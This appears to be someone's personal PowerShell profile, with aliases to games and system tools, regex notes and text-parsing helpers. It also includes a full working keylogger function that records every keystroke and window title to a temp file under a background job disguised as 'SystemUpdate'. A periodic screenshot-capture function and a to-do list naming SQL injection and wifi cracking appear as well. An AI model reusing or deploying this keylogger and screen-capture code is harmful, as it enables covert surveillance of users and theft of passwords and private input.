#别名区--------------------------------------------------------------------------------------------------------
Set-Alias -name pchunter -value 'D:\Program Files (x86)\PCHunter_free V1.2\PCHunter_free\PCHunter64.exe'

Set-Alias -name nfs11c -value 'C:\Game\Need for Speed(TM) Hot Pursuit\NSpeed_SSS.exe'
Set-Alias -name nfs11 -value Open-NFS11

Set-Alias -name ev4c -value 'C:\Game\Resident Evil 4\生化危机4终版HD版修改器.exe'
Set-Alias -name ev4c -value 'C:\Game\Resident Evil 4\Bin32\bio4.exe'
Set-Alias -name flgd -value 'C:\Game\State of Decay\StateOfDecay.exe'

Set-Alias -name ce -value 'C:\Game\Cheat Engine 6.4\Cheat Engine.exe'
Set-Alias -name vm -value 'C:\Program Files (x86)\VMware\VMware Workstation\vmware.exe'
Set-Alias -name sm -value 'D:\E盘\PowerShell\资料\程序集\扫描全盘文件v1.3.ps1'
Set-Alias -name fn -value Open-Prof

Set-Alias -name wsh2009 -value 'C:\Game\Warcraft3\U9WSH\ld.exe'
Set-Alias -name wsh2009c -value 'C:\Game\Warcraft3\U9WSH\wsh2009c.vbs'
Set-Alias -name pchunter -value 'C:\Program Files\PCHunter_free\PCHunter64.exe'
Set-Alias -name tv -value 'C:\Program Files (x86)\TeamViewer\Version9\TeamViewer.exe'


Set-Alias -name dwr -value 'D:\E盘\Python\成品\DumpWithRegex.py'
Set-Alias -name hash -value 'D:\E盘\VBS\AllInThere\成品\Hash排版.vbs'
Set-Alias -name wget -value 'D:\E盘\VBS\AllInThere\成品\wget.vbs'
Set-Alias -name vbsjm -value 'D:\E盘\VBS\AllInThere\成品\vbs加密\vbs最强加密_v2.0.vbs'
Set-Alias -name wmijs -value 'D:\E盘\VBS\AllInThere\修改\WMI\wmi检索\WMI检索.vbs'
Set-Alias -name tgu -value 'D:\E盘\Python\成品\TransGoogleUrl.py'
#--------------------------------------------------------------------------------------------------------------


#直接调用函数区-------------------------------------------------------------------------------------------------------
function Open-Prof{notepad $PROFILE}
function Open-NFS11{invoke-item "C:\Game\Need for Speed(TM) Hot Pursuit\NFS11.exe"}
function Get-Old($birthday){"{0:#.####}" -f (([datetime]::now-(get-date $birthday)).TotalDays/365)}
function Get-Netstat($port){do{netstat -an|findstr /i $port ; start-sleep 1;cls}while(1)}
function Get-IpPing(){ do{ [string]$(Get-Date -Format hh:mm:ss) +"  "+ [string]$(Get-IP) ; start-sleep 1}while(1) }
function dx(){"壹(壹)、贰(贰)、叁、肆(肆)、伍(伍)、陆(陆)、柒、捌、玖、拾、伯、仟"}
function bt5-mount(){"mount -o username=share,password=share //192.168.0.108/share /share/108
"}

function zz()
{
    "正向肯定预查"
    "\d(?=f)"
    ""
    "正向否定预查"
    "\d(?!f)"
    ""
    "反向肯定预查"
    "(?<=e)\d"
    ""
    "反向否定预查"
    "(?<!e)\d"
    "--------------------------------------------------------------------------------------------------------"
    "邮箱"
    "\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*"
    "[A-Za-z0-9_\x22]+([-+.][A-Za-z0-9_\x22]+)*@((\w+([-.]\w+)*\.\w+([-.]\w+)*)|(\x5B\d+\.\d+\.\d+\.\d+\x5D))"
    ""
    "去除空行"
    "^\x0d\x0a"
    "\x00"
    ""
    "不含某关键字的行"
    "^((?!fedex).)*$"
    ""
    "含某关键字的行"
    "^.*fedex.*$"
    ""
    "汉字"
    "[\u4e00-\u9fa5]"
    ""
    }

function ttl()
{
""
"Windows NT/2000/XP系统的默认TTL值为128"
"Win7系统的TTL值是64"
"Windows 98系统的TTL值为32"
"Linux系统的TTL值为64或255"
"UNIX主机的TTL值为255"
""
}


function task()
{
""
"1.vbs二进制读写文件，sql.vbs 安装数据库"
""
"2.学习SQL语言，数据库注入"
""
"3.Python界面"
""
"4.wifi破解"
""
}



Function Get-IP(){
    param($IP)
    $wc=New-Object System.Net.WebClient
    if($IP -eq $null){
        $wc.DownloadString("http://iframe.ip138.com/ic.asp") -match "<center>(.+?)</center>"|Out-Null
        $Matches[1]
    }
    else{
        $Content=$wc.DownloadString("http://ip138.com/ips138.asp?ip=$ip&action=2") 
        [regex]::matches($Content, '(?<=<h1>).+?(?=</h1>)').Value
        [regex]::matches($Content, '(?<=<li>).+?(?=</li>)').Value
    }
}

















#Get-ValidSimple -File c:\ttt.txt -Pattern "\d+"
function Get-ValidSimple{
    param($File,$Pattern)
    Get-Content $File -ReadCount 1|ForEach-Object{
        Write-Output ([regex]::Matches($_,$Pattern).Value)
    }
}










#Get-ValidComplex -File C:\Users\Roshan\Desktop\xxx.txt -PatternS @("\d+","@","\w+")
function Get-ValidComplex{
    param($File,$PatternS)
    $Content=Get-Content $File
    $Num=$PatternS.Count
    $Vailds=$PatternS
    for($i=0;$i -lt $Num;$i++){
        $Vailds[$i]=([RegEx]::Matches($Content,$PatternS[$i]).Value)
    }
    for($j=0;$j -lt $Vailds[0].Count ;$j++){
        for($k=0;$k -lt $Num ;$k++){
            $ret+=$Vailds[$k][$j] + [string]"`t"
        }
        Write-Output $ret
        $ret=""
    }
}






#Cut-TxtFile -File C:\Users\Roshan\Desktop\待发.txt -RowNum 50
function Cut-TxtFile(){
    param($File,$RowNum=100)
    $Folder=$File -replace "\\[^\\]+$","\\切割后"
    New-Item -Path $Folder -ItemType Directory –Force | Out-Null
    $n=0
    $FileName=0
    Get-Content $File -ReadCount 1|ForEach-Object{
        $n++
        if($n -lt $RowNum){
            $_ | Out-File "$Folder\$FileName.txt" -Append
        }
        else{
            $_ | Out-File "$Folder\$FileName.txt" -Append
            $n=0
            $FileName++
        }
    }
}







function Get-TimedOperationRecord {
    <#
        Author:fuhj(powershell#live.cn ,http://fuhaijun.com) 
	    Logs keys pressed, time and the active window.
    .Parameter LogPath
        Specifies the path where pressed key details will be logged. By default, keystroke are logged to '$($Env:TEMP)\key.log'.
    .Parameter CollectionInterval
        Specifies the interval in minutes to capture keystrokes. By default keystroke are captured indefinitely.
    .Example
        Get-TimedOperationRecord -LogPath C:\key.log
    .Example
        Get-TimedOperationRecord -CollectionInterval 20
    #>
        [CmdletBinding()] Param (
            [Parameter(Position = 0)]
            [ValidateScript({Test-Path (Resolve-Path (Split-Path -Parent $_)) -PathType Container})]
            [String]
            $LogPath = "$($Env:TEMP)\key.log",

            [Parameter(Position = 1)]
            [UInt32]
            $CollectionInterval
        )

        $LogPath = Join-Path (Resolve-Path (Split-Path -Parent $LogPath)) (Split-Path -Leaf $LogPath)

        Write-Verbose "Logging keystrokes to $LogPath"

        $Initilizer = {
            $LogPath = 'REPLACEME'

            '"TypedKey","Time","WindowTitle"' | Out-File -FilePath $LogPath -Encoding unicode

            function KeyLog {
                [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null

                try
                {
                    $ImportDll = [User32]
                }
                catch
                {
                    $DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib')
                    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
                    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Lib', $False)
                    $TypeBuilder = $ModuleBuilder.DefineType('User32', 'Public, Class')

                    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
                    $FieldArray = [Reflection.FieldInfo[]] @(
                        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
                        [Runtime.InteropServices.DllImportAttribute].GetField('ExactSpelling'),
                        [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'),
                        [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'),
                        [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'),
                        [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
                    )

                    $PInvokeMethod = $TypeBuilder.DefineMethod('GetAsyncKeyState', 'Public, Static', [Int16], [Type[]] @([Windows.Forms.Keys]))
                    $FieldValueArray = [Object[]] @(
                        'GetAsyncKeyState',
                        $True,
                        $False,
                        $True,
                        [Runtime.InteropServices.CallingConvention]::Winapi,
                        [Runtime.InteropServices.CharSet]::Auto
                    )
                    $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
                    $PInvokeMethod.SetCustomAttribute($CustomAttribute)

                    $PInvokeMethod = $TypeBuilder.DefineMethod('GetKeyboardState', 'Public, Static', [Int32], [Type[]] @([Byte[]]))
                    $FieldValueArray = [Object[]] @(
                        'GetKeyboardState',
                        $True,
                        $False,
                        $True,
                        [Runtime.InteropServices.CallingConvention]::Winapi,
                        [Runtime.InteropServices.CharSet]::Auto
                    )
                    $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
                    $PInvokeMethod.SetCustomAttribute($CustomAttribute)

                    $PInvokeMethod = $TypeBuilder.DefineMethod('MapVirtualKey', 'Public,Static', [Int32], [Type[]] @([Int32], [Int32]))
                    $FieldValueArray = [Object[]] @(
                        'MapVirtualKey',
                        $False,
                        $False,
                        $True,
                        [Runtime.InteropServices.CallingConvention]::Winapi,
                        [Runtime.InteropServices.CharSet]::Auto
                    )
                    $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
                    $PInvokeMethod.SetCustomAttribute($CustomAttribute)

                    $PInvokeMethod = $TypeBuilder.DefineMethod('ToUnicode', 'Public, Static', [Int32],
                        [Type[]] @([UInt32], [UInt32], [Byte[]], [Text.StringBuilder], [Int32], [UInt32]))
                    $FieldValueArray = [Object[]] @(
                        'ToUnicode',
                        $False,
                        $False,
                        $True,
                        [Runtime.InteropServices.CallingConvention]::Winapi,
                        [Runtime.InteropServices.CharSet]::Auto
                    )
                    $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
                    $PInvokeMethod.SetCustomAttribute($CustomAttribute)

                    $PInvokeMethod = $TypeBuilder.DefineMethod('GetForegroundWindow', 'Public, Static', [IntPtr], [Type[]] @())
                    $FieldValueArray = [Object[]] @(
                        'GetForegroundWindow',
                        $True,
                        $False,
                        $True,
                        [Runtime.InteropServices.CallingConvention]::Winapi,
                        [Runtime.InteropServices.CharSet]::Auto
                    )
                    $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
                    $PInvokeMethod.SetCustomAttribute($CustomAttribute)

                    $ImportDll = $TypeBuilder.CreateType()
                }

                Start-Sleep -Milliseconds 40

                    try
                    {

                        #loop through typeable characters to see which is pressed
                        for ($TypeableChar = 1; $TypeableChar -le 254; $TypeableChar++)
                        {
                            $VirtualKey = $TypeableChar
                            $KeyResult = $ImportDll::GetAsyncKeyState($VirtualKey)

                            #if the key is pressed
                            if (($KeyResult -band 0x8000) -eq 0x8000)
                            {

                                #check for keys not mapped by virtual keyboard
                                $LeftShift    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LShiftKey) -band 0x8000) -eq 0x8000
                                $RightShift   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RShiftKey) -band 0x8000) -eq 0x8000
                                $LeftCtrl     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LControlKey) -band 0x8000) -eq 0x8000
                                $RightCtrl    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RControlKey) -band 0x8000) -eq 0x8000
                                $LeftAlt      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LMenu) -band 0x8000) -eq 0x8000
                                $RightAlt     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RMenu) -band 0x8000) -eq 0x8000
                                $TabKey       = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Tab) -band 0x8000) -eq 0x8000
                                $SpaceBar     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Space) -band 0x8000) -eq 0x8000
                                $DeleteKey    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Delete) -band 0x8000) -eq 0x8000
                                $EnterKey     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Return) -band 0x8000) -eq 0x8000
                                $BackSpaceKey = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Back) -band 0x8000) -eq 0x8000
                                $LeftArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Left) -band 0x8000) -eq 0x8000
                                $RightArrow   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Right) -band 0x8000) -eq 0x8000
                                $UpArrow      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Up) -band 0x8000) -eq 0x8000
                                $DownArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Down) -band 0x8000) -eq 0x8000
                                $LeftMouse    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LButton) -band 0x8000) -eq 0x8000
                                $RightMouse   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000) -eq 0x8000

                                if ($LeftShift -or $RightShift) {$LogOutput += '[Shift]'}
                                if ($LeftCtrl  -or $RightCtrl)  {$LogOutput += '[Ctrl]'}
                                if ($LeftAlt   -or $RightAlt)   {$LogOutput += '[Alt]'}
                                if ($TabKey)       {$LogOutput += '[Tab]'}
                                if ($SpaceBar)     {$LogOutput += '[SpaceBar]'}
                                if ($DeleteKey)    {$LogOutput += '[Delete]'}
                                if ($EnterKey)     {$LogOutput += '[Enter]'}
                                if ($BackSpaceKey) {$LogOutput += '[Backspace]'}
                                if ($LeftArrow)    {$LogOutput += '[Left Arrow]'}
                                if ($RightArrow)   {$LogOutput += '[Right Arrow]'}
                                if ($UpArrow)      {$LogOutput += '[Up Arrow]'}
                                if ($DownArrow)    {$LogOutput += '[Down Arrow]'}
                                if ($LeftMouse)    {$LogOutput += '[Left Mouse]'}
                                if ($RightMouse)   {$LogOutput += '[Right Mouse]'}

                                #check for capslock
                                if ([Console]::CapsLock) {$LogOutput += '[Caps Lock]'}

                                $MappedKey = $ImportDll::MapVirtualKey($VirtualKey, 3)
                                $KeyboardState = New-Object Byte[] 256
                                $CheckKeyboardState = $ImportDll::GetKeyboardState($KeyboardState)

                                #create a stringbuilder object
                                $StringBuilder = New-Object -TypeName System.Text.StringBuilder;
                                $UnicodeKey = $ImportDll::ToUnicode($VirtualKey, $MappedKey, $KeyboardState, $StringBuilder, $StringBuilder.Capacity, 0)

                                #convert typed characters
                                if ($UnicodeKey -gt 0) {
                                    $TypedCharacter = $StringBuilder.ToString()
                                    $LogOutput += ('['+ $TypedCharacter +']')
                                }

                                #get the title of the foreground window
                                $TopWindow = $ImportDll::GetForegroundWindow()
                                $WindowTitle = (Get-Process | Where-Object { $_.MainWindowHandle -eq $TopWindow }).MainWindowTitle

                                #get the current DTG
                                $TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)

                                #Create a custom object to store results
                                $ObjectProperties = @{'Key Typed' = $LogOutput;
                                                      'Window Title' = $WindowTitle;
                                                      'Time' = $TimeStamp}
                                $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
                                $CSVEntry = ($ResultsObject | ConvertTo-Csv -NoTypeInformation)[1]
                                #return results
                                Out-File -FilePath $LogPath -Append -InputObject $CSVEntry -Encoding unicode

                            }
                        }
                    }
                    catch {}
                }
            }

        $Initilizer = [ScriptBlock]::Create(($Initilizer -replace 'REPLACEME', $LogPath))

        Start-Job -InitializationScript $Initilizer -ScriptBlock {for (;;) {Keylog}} -Name SystemUpdate | Out-Null

        if ($PSBoundParameters['CollectionInterval'])
        {
            $Timer = New-Object Timers.Timer($CollectionInterval * 60 * 1000)

            Register-ObjectEvent -InputObject $Timer -EventName Elapsed -SourceIdentifier ElapsedAction -Action {
                Stop-Job -Name SystemUpdate
                Unregister-Event -SourceIdentifier ElapsedAction
                $Sender.Stop()
            } | Out-Null
        }
}



function Get-TimedScreenshot(){
    [CmdletBinding()] Param(
        [Parameter(Mandatory=$True)]             
        [ValidateScript({Test-Path -Path $_ })]
        [String] $Path, 

        [Parameter(Mandatory=$True)]             
        [Int32] $Interval,

        [Parameter(Mandatory=$True)]             
        [String] $EndTime    
    )

    #Define helper function that generates and saves screenshot
    Function Get-Screenshot {
       $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen
       $ScreenshotObject = New-Object Drawing.Bitmap $ScreenBounds.Width, $ScreenBounds.Height
       $DrawingGraphics = [Drawing.Graphics]::FromImage($ScreenshotObject)
       $DrawingGraphics.CopyFromScreen( $ScreenBounds.Location, [Drawing.Point]::Empty, $ScreenBounds.Size)
       $DrawingGraphics.Dispose()
       $ScreenshotObject.Save($FilePath)
       $ScreenshotObject.Dispose()
    }
    Try {

        #load required assembly
        Add-Type -Assembly System.Windows.Forms            

        Do {
            #get the current time and build the filename from it
            $Time = (Get-Date)

            [String] $FileName = "$($Time.Month)"
            $FileName += '-'
            $FileName += "$($Time.Day)" 
            $FileName += '-'
            $FileName += "$($Time.Year)"
            $FileName += '-'
            $FileName += "$($Time.Hour)"
            $FileName += '-'
            $FileName += "$($Time.Minute)"
            $FileName += '-'
            $FileName += "$($Time.Second)"
            $FileName += '.png'

            #use join-path to add path to filename
            [String] $FilePath = (Join-Path $Path $FileName)

            #run screenshot function
            Get-Screenshot

            Write-Verbose "Saved screenshot to $FilePath. Sleeping for $Interval seconds"

            Start-Sleep -Seconds $Interval
        }

        #note that this will run once regardless if the specified time as passed
        While ((Get-Date -Format HH:mm) -lt $EndTime)
    }

    Catch {Write-Error $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage}
}



function Convert-TextObject(){
param(
    [string] $delimiter,
    [string] $parseExpression,
    [string[]] $propertyName,
    [type[]] $propertyType
)

function Usage(){
 @'
        Usage:
        "Hello World"|Convert-TextObject
        "Hello World"|Convert-TextObject -Delimiter "ll"
        "Hello World"|Convert-TextObject -parseExpression "He(.+?)r(.+)$"
        "Hello World"|Convert-TextObject -propertyName First,Second
        "123 456"|Convert-TextObject -propertyType $([string],[int])
'@
    return
}
function main($inputObjects,$parseExpression,$propertyType,$propertyName,$delimiter){
    $delimiterSpecified=[bool]$delimiter
    $parseExpressionSpecified=[bool]$parseExpression
    if (($delimiterSpecified -and $parseExpressionSpecified)){
        Usage
        return
    }
    if(-not $($delimiterSpecified -or $parseExpressionSpecified)){
        $delimiter="\s+"
        $delimiterSpecified = $true
    }
    foreach($inputObject in $inputObjects){
        if(-not $inputObject) {$inputObject = ""}
        foreach($inputLine in $inputObject.ToString()){
            parseTextObject $inputLine $delimiter $parseExpression $propertyType $propertyName
        }
    }
}

function ParseTextObject{
    param($textInput,$delimiter,$parseExpression,$propertyTypes,$propertyNames)
    $parseExpressionSpecified = -not $delimiter
    $returnObject=New-Object PSObject
    $matches=$null
    $matchCount=0
    if ($parseExpressionSpecified){
        [void]($textInput -match $parseExpression)
        $matchCount=$matches.Count
    }
    else{
        $matches=[Regex]::Split($textInput,$delimiter)
        $matchCount=$matches.Length
    }
    $counter=0
    if($parseExpressionSpecified){$counter++}
    for(;$counter -lt $matchCount;$counter++){
            $propertyName="None"
            $propertyType=[string]
            if($parseExpressionSpecified){
                $propertyName="Property$counter"
                if($counter -le $propertyNames.Length){
                    if ($propertyName[$counter-1]){
                        $propertyName=$propertyName[$counter-1]
                    }
                }
                if($counter -le $propertyTypes.Length){
                    if($propertyType[$counter-1]){
                        $propertyType=$propertyType[$counter-1]
                    }
                }
            }
        else{
            $propertyName="Property$($counter+1)"
            if($counter -lt $propertyNames.Length){
                if($propertyNames[$counter]){
                    $propertyName=$propertyNames[$counter]
                }
            }
            if ($counter -lt $propertyTypes.Length){
                if($propertyTypes[$counter]){
                    $propertyType=$propertyTypes[$counter]
                }
            }
        }
        Add-Note $returnObject $propertyName ($matches[$counter] -as $propertyType)
    }
    $returnObject
}

function Add-Note($object,$name,$value){
    $object | Add-Member NoteProperty $name $value
}

Main $input $parseExpression $propertyType $propertyName $delimiter
}








#--------------------------------------------------------------------------------------------------------------







#可修改代码集中区----------------------------------------------------------------------------------------------------
@"
	$wordApp = New-Object -COM Word.Application
	$excelApp = New-Object -COM Excel.Application
	$ie = new-object -com "InternetExplorer.Application"
	$WC=New-Object System.Net.WebClient

	[RegEx]::Matches("a1b2c3","\d").Value



"@|Out-Null
#--------------------------------------------------------------------------------------------------------------